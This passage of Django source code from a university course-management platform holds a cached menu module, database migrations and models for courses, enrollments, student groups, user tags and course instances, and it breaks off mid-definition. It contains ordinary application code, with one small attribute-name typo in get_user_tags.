isinstance(obj, self.model) or # skip objects that are not model in question\n            user.is_staff or\n            user.is_superuser or\n            self.is_object_visible(request, view, obj)\n        )\n\n    def is_object_visible(self, request, view, obj):\n        raise NotImplementedError\n/n/n/ncourse/cache/menu.py/n/nfrom django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom ..models import StudentGroup, Enrollment, CourseInstance, Course\nfrom ..renders import render_group_info\n\n\nclass CachedTopMenu(CachedAbstract):\n    KEY_PREFIX = 'topmenu'\n\n    def __init__(self, user):\n        self.user = user\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        profile = user.userprofile if user and user.is_authenticated else None\n        return {\n            'courses': self._generate_courses(profile),\n            'groups': self._generate_groups(profile),\n        }\n\n    def _generate_courses(self, profile):\n        if not profile:\n            return []\n\n        def course_entry(instance):\n            return {\n                'name': str(instance),\n                'link': instance.get_absolute_url(),\n            }\n        def divider_entry():\n            return {\n                'divider': True,\n            }\n\n        enrolled = []\n        for instance in profile.enrolled.all():\n            enrolled.append(course_entry(instance))\n\n        teaching = []\n        for course in profile.teaching_courses.all():\n            for instance in course.instances.all():\n                teaching.append(course_entry(instance))\n\n        assisting = []\n        for instance in profile.assisting_courses.all():\n            assisting.append(course_entry(instance))\n\n        courses = []\n        courses.extend(enrolled)\n        if courses and teaching:\n            courses.append(divider_entry())\n        courses.extend(teaching)\n        if courses and assisting:\n            courses.append(divider_entry())\n        courses.extend(assisting)\n        return courses\n\n    def _generate_groups(self, profile):\n        if not profile:\n            return {}\n\n        def group_entry(group):\n            return {\n                'id': group.id,\n                'size': group.members.count(),\n                'collaborators': group.collaborator_names(profile),\n            }\n\n        group_map = {}\n        for enrollment in Enrollment.objects\\\n                .filter(user_profile=profile)\\\n                .select_related('selected_group')\\\n                .prefetch_related('selected_group__members'):\n            instance_id = enrollment.course_instance_id\n            group_map[instance_id] = (\n                [\n                    group_entry(g) for g in profile.groups\\\n                        .filter(course_instance_id=instance_id)\\\n                        .prefetch_related('members')\n                ],\n                render_group_info(enrollment.selected_group, profile)\n            )\n        return group_map\n\n    def courses(self):\n        return self.data['courses']\n\n    def groups(self, instance):\n        return self.data['groups'].get(instance.id, ([],None))\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    CachedTopMenu.invalidate(instance.user_profile.user)\n\ndef invalidate_assistants(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.assistants.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_teachers(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.teachers.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_members(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.members.all():\n            CachedTopMenu.invalidate(profile.user)\n\n\n# Automatically invalidate cached menu when enrolled or edited.\npost_save.connect(invalidate_content, sender=Enrollment)\npost_delete.connect(invalidate_content, sender=Enrollment)\nm2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)\nm2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)\nm2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)\n/n/n/ncourse/migrations/0001_initial.py/n/n# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Course',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('code', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text=b\"Input an identifier for this course's URL.\", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseHook',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('hook_url', models.URLField()),\n                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseInstance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('instance_name', models.CharField(max_length=255)),\n                ('website', models.URLField(max_length=255, blank=True)),\n                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('starting_time', models.DateTimeField()),\n                ('ending_time', models.DateTimeField()),\n                ('visible_to_students', models.BooleanField(default=True)),\n                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),\n                ('course', models.ForeignKey(related_name='instances', to='course.Course', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='courseinstance',\n            unique_together=set([('course', 'url')]),\n        ),\n        migrations.AddField(\n            model_name='coursehook',\n            name='course_instance',\n            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n    ]\n/n/n/ncourse/migrations/0005_auto_20150625_1835.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\nimport lib.fields\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('inheritance', '0001_initial'),\n        ('course', '0004_auto_20150625_1821'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\\\w\\\\-\\\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),\n                ('chapter', models.IntegerField(default=1)),\n                ('subchapter', models.IntegerField(default=1)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('content_url', models.URLField(blank=True)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursemodule',\n            unique_together=set([('course_instance', 'url')]),\n        ),\n    ]\n\n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n/n/n/ncourse/migrations/0006_auto_20150721_1152.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0005_auto_20150625_1835'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),\n                ('order', models.IntegerField(default=1)),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255)),\n                ('content_url', models.URLField(help_text='The resource to show.')),\n                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule', on_delete=models.CASCADE)),\n            ],\n            options={\n                'ordering': ['course_module', 'order', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([('course_module', 'url')]),\n        ),\n        migrations.AlterModelOptions(\n            name='coursemodule',\n            options={'ordering': ['closing_time', 'order', 'id']},\n        ),\n        migrations.RenameField(\n            model_name='coursemodule',\n            old_name='chapter',\n            new_name='order',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='content_url',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='subchapter',\n        ),\n        migrations.AlterField(\n            model_name='course',\n            name='url',\n            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='url',\n            field=models.CharField(help_text='Input an URL identifier for this module.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255),\n            preserve_default=True,\n        ),\n    ]\n/n/n/ncourse/migrations/0011_auto_20151215_1133.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0010_auto_20151214_1714'),\n    ]\n\n    operations = [\n        migrations.AddField(\n            model_name='coursechapter',\n            name='parent',\n            field=models.ForeignKey(to='course.CourseChapter', blank=True, null=True, related_name='children', on_delete=models.CASCADE),\n            preserve_default=True,\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([]),\n        ),\n    ]\n/n/n/ncourse/migrations/0021_auto_20160726_1209.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('course', '0020_auto_20160615_1239'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Enrollment',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('personal_code', models.CharField(max_length=10, blank=True, default='')),\n                ('course_instance', models.ForeignKey(to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('user_profile', models.ForeignKey(to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='courseinstance',\n            name='students2',\n            field=models.ManyToManyField(to='userprofile.UserProfile', through='course.Enrollment', related_name='enrolled', blank=True),\n            preserve_default=True,\n        ),\n    ]\n/n/n/ncourse/migrations/0025_auto_20160728_1139.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.db.models.deletion\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0024_auto_20160726_1232'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='StudentGroup',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', primary_key=True, auto_created=True, serialize=False)),\n                ('timestamp', models.DateTimeField(auto_now_add=True)),\n                ('course_instance', models.ForeignKey(related_name='groups', to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('members', models.ManyToManyField(to='userprofile.UserProfile', related_name='groups')),\n            ],\n            options={\n                'ordering': ['course_instance', 'timestamp'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AddField(\n            model_name='enrollment',\n            name='selected_group',\n            field=models.ForeignKey(null=True, on_delete=django.db.models.deletion.SET_NULL, default=None, blank=True, to='course.StudentGroup'),\n            preserve_default=True,\n        ),\n    ]\n/n/n/ncourse/migrations/0029_usertags.py/n/n# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport lib.models\nimport colorfield.fields\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0003_auto_20160728_1139'),\n        ('course', '0028_auto_20160825_0601'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='UserTag',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=200)),\n                ('description', models.CharField(blank=True, max_length=164, help_text='Describe the usage or meaning of this usertag')),\n                ('visible_to_students', models.BooleanField(default=False)),\n                ('color', colorfield.fields.ColorField(default='#CD0000', help_text='Color that is used for this tag.', max_length=10)),\n                ('course_instance', models.ForeignKey(related_name='usertags', to='course.CourseInstance', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(lib.models.UrlMixin, models.Model),\n        ),\n        migrations.CreateModel(\n            name='UserTagging',\n            fields=[\n                ('id', models.AutoField(auto_created=True, serialize=False, primary_key=True, verbose_name='ID')),\n                ('course_instance', models.ForeignKey(related_name='taggings', to='course.CourseInstance', on_delete=models.CASCADE)),\n                ('tag', models.ForeignKey(related_name='taggings', to='course.UserTag', on_delete=models.CASCADE)),\n                ('user', models.ForeignKey(related_name='taggings', to='userprofile.UserProfile', on_delete=models.CASCADE)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='usertagging',\n            unique_together=set([('tag', 'user', 'course_instance')]),\n        ),\n        migrations.AlterIndexTogether(\n            name='usertagging',\n            index_together=set([('user', 'course_instance')]),\n        ),\n    ]\n/n/n/ncourse/models.py/n/nimport datetime\nimport json\nimport logging\nimport string\nimport urllib.request, urllib.parse\nfrom random import randint, choice\n\nfrom django.conf import settings\nfrom django.contrib import messages\nfrom django.contrib.contenttypes.fields import GenericRelation\nfrom django.contrib.staticfiles import finders\nfrom django.core.exceptions import ValidationError\nfrom django.urls import reverse\nfrom django.db import models\nfrom django.db.models import Q, Count\nfrom django.db.models.signals import post_save\nfrom django.utils import timezone\nfrom django.utils.functional import cached_property\nfrom django.utils.translation import ugettext_lazy as _\nfrom django_colortag.models import ColorTag\n\nfrom apps.models import BaseTab, BasePlugin\nfrom lib.email_messages import email_course_error\nfrom lib.fields import PercentField\nfrom lib.helpers import (\n    safe_file_name,\n    resize_image,\n    roman_numeral,\n    get_random_string,\n    Enum,\n)\nfrom lib.remote_page import RemotePage, RemotePageException\nfrom lib.models import UrlMixin\nfrom lib.validators import generate_url_key_validator\nfrom userprofile.models import User, UserProfile, GraderUser\n\nlogger = logging.getLogger(\"course.models\")\n\n# Read pseudonymization data from file\nwith open(finders.find('pseudonym.json')) as json_file:\n    DATA = json.load(json_file)\n\nclass Course(UrlMixin, models.Model):\n    \"\"\"\n    Course model represents a course in a university. A course has a name and an\n    identification number. It also has a URL which is included in the addresses\n    of pages under the course.\n    \"\"\"\n    name = models.CharField(max_length=255)\n    code = models.CharField(max_length=255)\n    url = models.CharField(unique=True, max_length=255, blank=False,\n        validators=[generate_url_key_validator()],\n        help_text=_(\"Input an URL identifier for this course.\"))\n    teachers = models.ManyToManyField(UserProfile,\n        related_name=\"teaching_courses\", blank=True)\n\n    def __str__(self):\n        return \"{} {}\".format(self.code, self.name)\n\n    def clean(self):\n        super().clean()\n        RESERVED = (\"admin\", \"accounts\", \"shibboleth\", \"api\",\n            \"archive\", \"course\", \"exercise\", \"diploma\")\n        if self.url in RESERVED:\n            raise ValidationError({\n                'url':_(\"Taken words include: {}\").format(\n                    \", \".join(RESERVED))\n            })\n\n    def is_teacher(self, user):\n        return (\n            user and\n            user.is_authenticated and (\n                user.is_superuser or (\n                    isinstance(user, User) and\n                    self.teachers.filter(id=user.userprofile.id).exists()\n                ) or (\n                    isinstance(user, GraderUser) and\n                    user._course == self\n                )\n            )\n        )\n\n\n    ABSOLUTE_URL_NAME = \"course-instances\"\n\n    def get_url_kwargs(self):\n        return dict(course_slug=self.url)\n\n\nclass StudentGroup(models.Model):\n    \"\"\"\n    Stores a user group for a course instance.\n    \"\"\"\n    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE,\n        related_name='groups')\n    members = models.ManyToManyField(UserProfile, related_name='groups')\n    timestamp = models.DateTimeField(auto_now_add=True)\n\n    class Meta:\n        ordering = ['course_instance','timestamp']\n\n    @classmethod\n    def get_exact(cls, course_instance, member_profiles):\n        for group in cls.objects.filter(\n            course_instance=course_instance,\n            members=member_profiles[0]\n        ):\n            if group.equals(member_profiles):\n                return group\n        return None\n\n    @classmethod\n    def filter_collaborators_of(cls, members, profile):\n        return [p for p in members if p != profile]\n\n    @classmethod\n    def format_collaborator_names(cls, members, profile):\n        return \", \".join(p.user.get_full_name()\n            for p in cls.filter_collaborators_of(members, profile))\n\n    def equals(self, profiles):\n        return set(self.members.all()) == set(profiles)\n\n    def collaborators_of(self, profile):\n        return self.filter_collaborators_of(self.members.all(), profile)\n\n    def collaborator_names(self, profile):\n        return self.format_collaborator_names(self.members.all(), profile)\n\n\nclass Enrollment(models.Model):\n    \"\"\"\n    Maps an enrolled student in a course instance.\n    \"\"\"\n    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE)\n    user_profile = models.ForeignKey(UserProfile, on_delete=models.CASCADE)\n    timestamp = models.DateTimeField(auto_now_add=True)\n    personal_code = models.CharField(max_length=10, blank=True, default='')\n    selected_group = models.ForeignKey(StudentGroup, on_delete=models.SET_NULL,\n        blank=True, null=True, default=None)\n    anon_name = models.CharField(max_length=50, blank=True, default='')\n    anon_id = models.CharField(max_length=50, blank=True, null=True, unique=True)\n\ndef create_enrollment_code(sender, instance, created, **kwargs):\n    if created:\n        easychars = '0123456789ABCDEFGHJKLMNPQRSTUVXYZ'\n        code = get_random_string(6, easychars)\n        while Enrollment.objects.filter(course_instance=instance.course_instance, personal_code=code).exists():\n            code = get_random_string(6, easychars)\n        instance.personal_code = code\n        instance.save()\n\ndef create_anon_id(sender, instance, created, **kwargs):\n    if created or not instance.anon_id:\n        nums = string.digits + string.ascii_lowercase\n        code = get_random_string(16, nums)\n        i = 0\n        while Enrollment.objects.filter(anon_id=code).exists():\n            code = get_random_string(16, nums)\n            i += 1\n            if i > 10000:\n                raise RuntimeError(\"No anonymous user ids available\")\n        instance.anon_id = code\n        instance.save(update_fields=['anon_id'])\n\ndef pseudonymize(sender, instance, created, **kwargs):\n    if created or not instance.anon_name:\n        def namegen():\n            '''\n             If the color-animal pairs are starting to run out, add another color.\n             This is highly unlikely, as there are roughly 140*68=9520 possible combinations\n            '''\n            second_name = \"\"\n            if Enrollment.objects.filter(course_instance=instance.course_instance).count() > len(DATA[\"colors\"]) * len(DATA[\"animals\"]) * 0.75:\n                second_name = choice(DATA[\"colors\"])[\"name\"]\n            return choice(DATA[\"colors\"])[\"name\"] + second_name + \" \" + choice(DATA[\"animals\"])\n\n        codename = namegen()\n        i = 0\n        while Enrollment.objects.filter(course_instance=instance.course_instance, anon_name=codename).exists():\n            codename = namegen()\n            i += 1\n            if i > 10000:\n                raise RuntimeError(\"No anonymous usernames available\")\n        instance.anon_name = codename\n        instance.save(update_fields=['anon_name'])\n\npost_save.connect(create_enrollment_code, sender=Enrollment)\npost_save.connect(create_anon_id, sender=Enrollment)\npost_save.connect(pseudonymize, sender=Enrollment)\n\n\nclass UserTag(UrlMixin, ColorTag):\n    course_instance = models.ForeignKey('CourseInstance', on_delete=models.CASCADE,\n        related_name=\"usertags\")\n    visible_to_students = models.BooleanField(default=False)\n\n    class Meta:\n        ordering = ['course_instance', 'name']\n\n    def get_url_kwargs(self):\n        return dict(tag_id=self.id, **self.course_instance.get_url_kwargs())\n\n    def is_valid_slug(self, slug_candidate):\n        assert self.course_instance\n        return slug_candidate != '' and not UserTag.objects.filter(\n            course_instance=self.course_instance,\n            slug=slug_candidate,\n        ).exists()\n\n\nclass UserTaggingManager(models.Manager):\n\n    def tags_for_instance(self, course_instance):\n        ts = self.filter(course_instance=course_instance)\\\n            .select_related('tag')\n        return [t.tag for t in ts]\n\n    def set(self, profile, tag):\n        return self.get_or_create(\n            tag=tag,\n            user=profile,\n            course_instance=tag.course_instance,\n        )\n\n    def unset(self, profile, tag):\n        self.filter(\n            tag=tag,\n            user=profile,\n        ).delete()\n\n\nclass UserTagging(models.Model):\n    tag = models.ForeignKey(UserTag,\n                            on_delete=models.CASCADE,\n                            related_name=\"taggings\")\n    user = models.ForeignKey(UserProfile,\n                             on_delete=models.CASCADE,\n                             related_name=\"taggings\",\n                             db_index=True)\n    course_instance = models.ForeignKey('CourseInstance',\n                                        on_delete=models.CASCADE,\n                                        related_name=\"taggings\",\n                                        db_index=True)\n    objects = UserTaggingManager()\n\n    def __str__(self):\n        return 'tag: {tag}, user: {user}'.format(\n            tag=self.tag.name,\n            user=self.user.user.username\n        )\n\n    class Meta:\n        unique_together = ('tag', 'user', 'course_instance')\n        index_together = (\n            ('user', 'course_instance'),\n        )\n        ordering = ['tag']\n\n\ndef get_course_visibility_filter(user, prefix=None):\n    class OR(Q):\n        default = Q.OR\n\n    filters = (\n        ('visible_to_students', True),\n    )\n    if isinstance(user, User):\n        user = user.userprofile\n        filters += (\n            ('assistants', user),\n            ('course__teachers', user),\n        )\n    elif isinstance(user, GraderUser):\n        filters += (\n            ('course', user._course),\n        )\n    filters = dict(\n        ((prefix+name if prefix else name), val)\n        for name, val in filters\n    )\n    return OR(**filters)\n\n\nclass CourseInstanceManager(models.Manager):\n    \"\"\"\n    Helpers in CourseInstance.objects\n    \"\"\"\n\n    def get_queryset(self):\n        return super().get_queryset().select_related('course').order_by('-starting_time')\n\n    def get_visible(self, user=None):\n        if not user or not user.is_authenticated:\n            return self.filter(visible_to_students=True)\n        if not user.is_superuser:\n            return self.filter(get_course_visibility_filter(user)).distinct()\n        return self.all()\n\n\ndef build_upload_dir(instance, filename):\n    \"\"\"\n    Returns the path to a directory where the instance image should be saved.\n    \"\"\"\n    return \"public/course_instance_{:d}/{}\".format(\n        instance.id,\n        safe_file_name(filename)\n    )\n\n\nclass CourseInstance(UrlMixin, models.Model):\n    \"\"\"\n    CourseInstance class represent an instance of a course. A single course may have\n    several instances either at the same time or during different years. All instances\n    have the same teacher, but teaching assistants and students are connected to individual\n    instances.\n    \"\"\"\n    ENROLLMENT_AUDIENCE = Enum([\n        ('INTERNAL_USERS', 1, _('Internal users')),\n        ('EXTERNAL_USERS', 2, _('External users')),\n        ('ALL_USERS', 3, _('Internal and external users')),\n    ])\n    VIEW_ACCESS = Enum([\n        ('ENROLLED', 1, _('Enrolled students')),\n        ('ENROLLMENT_AUDIENCE', 2, _('Enrollment audience')),\n        ('ALL_REGISTERED', 3, _('All registered users')),\n        ('PUBLIC', 4, _('Public to internet')),\n    ])\n    INDEX_TYPE = Enum([\n        ('RESULTS', 0, _('User results')),\n        ('TOC', 1, _(\"Table of contents\")),\n        ('LAST', 2, _(\"Link to last visited content\")),\n        ('EXPERIMENT', 10, _(\"Experimental setup (hard-coded)\")),\n    ])\n    CONTENT_NUMBERING = Enum([\n        ('NONE', 0, _(\"No numbering\")),\n        ('ARABIC', 1, _(\"Arabic\")),\n        ('ROMAN', 2, _(\"Roman\")),\n        ('HIDDEN', 3, _(\"Hidden arabic\")),\n    ])\n\n    course = models.ForeignKey(Course, on_delete=models.CASCADE, related_name=\"instances\")\n    instance_name = models.CharField(max_length=255)\n    url = models.CharField(max_length=255, blank=False,\n        validators=[generate_url_key_validator()],\n        help_text=_(\"Input an URL identifier for this course instance.\"))\n    visible_to_students = models.BooleanField(default=True)\n    enrollment_audience = models.IntegerField(choices=ENROLLMENT_AUDIENCE.choices,\n                                              default=ENROLLMENT_AUDIENCE.INTERNAL_USERS)\n    view_content_to = models.IntegerField(choices=VIEW_ACCESS.choices,\n                                          default=VIEW_ACCESS.ENROLLED)\n    starting_time = models.DateTimeField()\n    ending_time = models.DateTimeField()\n    lifesupport_time = models.DateTimeField(blank=True, null=True)\n    archive_time = models.DateTimeField(blank=True, null=True)\n    enrollment_starting_time = models.DateTimeField(blank=True, null=True)\n    enrollment_ending_time = models.DateTimeField(blank=True, null=True)\n    image = models.ImageField(blank=True, null=True, upload_to=build_upload_dir)\n    language = models.CharField(max_length=255, blank=True, default=\"\")\n    description = models.TextField(blank=True)\n    footer = models.TextField(blank=True)\n    index_mode = models.IntegerField(choices=INDEX_TYPE.choices, default=INDEX_TYPE.RESULTS,\n        help_text=_('Select content for the course index page.'))\n    module_numbering = models.IntegerField(choices=CONTENT_NUMBERING.choices,\n                                           default=CONTENT_NUMBERING.ARABIC)\n    content_numbering = models.IntegerField(choices=CONTENT_NUMBERING.choices,\n                                            default=CONTENT_NUMBERING.ARABIC)\n    head_urls = models.TextField(blank=True,\n        help_text=_(\"External CSS and JS resources \"\n            \"that are included on all course pages. \"\n            \"Separate with white space.\"))\n    configure_url = models.URLField(blank=True)\n    build_log_url = models.URLField(blank=True)\n    last_modified = models.DateTimeField(auto_now=True, blank=True, null=True)\n    technical_error_emails = models.CharField(max_length=255, blank=True,\n        help_text=_(\"By default exercise errors are reported to teacher \"\n            \"email addresses. Set this field as comma separated emails to \"\n            \"override the recipients.\"))\n    plugins = GenericRelation(BasePlugin, object_id_field=\"container_pk\",\n                                      content_type_field=\"container_type\")\n    tabs = GenericRelation(BaseTab, object_id_field=\"container_pk\",\n                                   content_type_field=\"container_type\")\n\n    assistants = models.ManyToManyField(UserProfile, related_name=\"assisting_courses\", blank=True)\n    students = models.ManyToManyField(UserProfile, related_name=\"enrolled\", blank=True, through='Enrollment')\n    # usertags from course.models.UserTag\n    # taggings from course.models.UserTagging\n    # categories from course.models.LearningObjectCategory\n    # course_modules from course.models.CourseModule\n\n    objects = CourseInstanceManager()\n\n    class Meta:\n        unique_together = (\"course\", \"url\")\n\n    def __str__(self):\n        return \"{}: {}\".format(str(self.course), self.instance_name)\n\n    def clean(self):\n        super().clean()\n        errors = {}\n        if self.ending_time <= self.starting_time:\n            errors['ending_time'] = _(\"Ending time must be later than starting time.\")\n        if self.lifesupport_time and self.lifesupport_time < self.ending_time:\n            errors['lifesupport_time'] = _(\"Lifesupport time must be later than ending time.\")\n        if (self.archive_time and not self.lifesupport_time) \\\n                or (self.lifesupport_time and not self.archive_time):\n            # Must not set only one of lifesupport and archive time since their\n            # default values could change their order. Lifesupport time must not\n            # be earlier than archive time.\n            errors['archive_time'] = _(\"Lifesupport time and archive time must be either both set or both unset.\")\n        elif self.archive_time and self.archive_time < self.lifesupport_time:\n            errors['archive_time'] = _(\"Archive time must be later than lifesupport time.\")\n        if self.language.startswith(\"|\"):\n            langs = list(filter(None, self.language.split(\"|\"))) # remove pipes & empty strings\n            for lang in langs:\n                if not self.is_valid_language(lang):\n                    if \"language\" in errors:\n                        errors['language'] += (\", \" + lang)\n                    else:\n                        errors['language'] = _(\"Language code(s) missing from settings: \") + lang\n        elif not self.is_valid_language(self.language):\n            errors['language'] = _(\"Language code missing from settings.\")\n        if errors:\n            raise ValidationError(errors)\n\n    def is_valid_language(self, lang):\n        return lang == \"\" or lang in [key for key,name in settings.LANGUAGES]\n\n    def save(self, *args, **kwargs):\n        \"\"\"\n        Saves the model.\n        \"\"\"\n        super().save(*args, **kwargs)\n        if self.image:\n            resize_image(self.image.path, (800,600))\n\n    def is_assistant(self, user):\n        return (\n            user and\n            user.is_authenticated and\n            isinstance(user, User) and\n            self.assistants.filter(id=user.userprofile.id).exists()\n        )\n\n    def is_teacher(self, user):\n        return self.course.is_teacher(user)\n\n    def is_course_staff(self, user):\n        return self.is_teacher(user) or self.is_assistant(user)\n\n    def is_student(self, user):\n        return (\n            user and\n            user.is_authenticated and\n            isinstance(user, User) and\n            self.students.filter(id=user.userprofile.id).exists()\n        )\n\n    def is_enrollable(self, user):\n        if user and user.is_authenticated and self.visible_to_students:\n            if self.enrollment_audience == self.ENROLLMENT_AUDIENCE.INTERNAL_USERS:\n                return not user.userprofile.is_external\n            if self.enrollment_audience == self.ENROLLMENT_AUDIENCE.EXTERNAL_USERS:\n                return user.userprofile.is_external\n            return True\n        return False\n\n    def enroll_student(self, user):\n        if user and user.is_authenticated:\n            Enrollment.objects.get_or_create(course_instance=self, user_profile=user.userprofile)\n\n    def tag_user(self, user, tag):\n        UserTagging.objects.create(tag=tag, user=user.userprofile, course_instance=self)\n\n    def get_enrollment_for(self, user):\n        return Enrollment.objects.filter(course_instance=self, user_profile=user.userprofile).first()\n\n    def get_user_tags(self, user):\n        return self.taggings.filter(user=user.uesrprofile).select_related('tag')\n\n    def get_course_staff_profiles(self):\n        return UserProfile.objects.filter(Q(teaching_courses=self.course) | Q(assisting_courses=self))\\\n            .distinct()\n\n    def 